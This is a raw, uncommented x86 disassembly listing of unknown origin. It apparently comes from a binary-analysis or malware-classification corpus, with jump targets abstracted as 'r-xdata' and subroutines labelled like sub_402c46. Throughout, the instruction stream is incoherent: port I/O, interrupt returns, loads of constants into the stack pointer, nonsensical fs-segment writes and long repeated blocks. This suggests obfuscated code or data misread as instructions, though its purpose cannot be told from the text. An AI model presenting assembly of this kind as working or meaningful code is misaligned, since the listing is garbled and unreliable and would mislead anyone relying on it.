ja 0xffffffffff9bacd3
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffcfd2a
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0b069
add esp 0x4
jae r-xdata
jl 0xf3adae
jge r-xdata
jpe 0x74cd3c6d
pop eax
jg r-xdata
jge 0xffffffff894f84a7
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428a523
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402b7a
jne r-xdata
add esp 0x8
jg 0xf44f009
jae r-xdata
ja 0xffffffffa3c33a16
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bacd3
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeaffc
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402be2
jb 0xffffffff81b2a898
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
add esp 0x4
jae r-xdata
jl 0xf3adae
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f84a7
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428a523
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b008
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcfd2a
jno r-xdata
jge 0xffffffffffa0b069
jge r-xdata
jpe 0x74cd3c6d
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402be2
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcaae2c
jno r-xdata
js 0x7f44efeb
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158b008
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeaffc
pop edx
jge r-xdata
jo 0xffffffff854f8525
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402be2
jb 0xffffffff81b2a898
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33a16
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jge r-xdata
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jg r-xdata
sub edi 0xf681b871
jne r-xdata
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jg r-xdata
ja 0xffffffffff9bacd3
pop ecx
jne r-xdata
jbe 0xffcfd2a
jno r-xdata
and ebx 0x870f4975
jno r-xdata
jge 0xffffffffffa0b069
jae r-xdata
xor esi 0xe681cd75
jge r-xdata
jpe 0x74cd3c6d
add esp 0x4
jae r-xdata
jl 0xf3adae
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f84a7
add [ eax ] al
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a523
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402c46
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_402d43
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_402c84
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x586621fd
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b235
push esp
push eax
call sub_402d2a
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13bc5
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402ca7
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b235
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x586621fd
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13bc5
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
push esp
push eax
call sub_402d2a
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402caa
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b235
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402cc1
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119b404
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd3c6d
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b235
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x586621fd
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_402d2a
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13bc5
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402cda
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13bc5
jl 0xffffffffc1c16007
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x586621fd
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
iretd
push esp
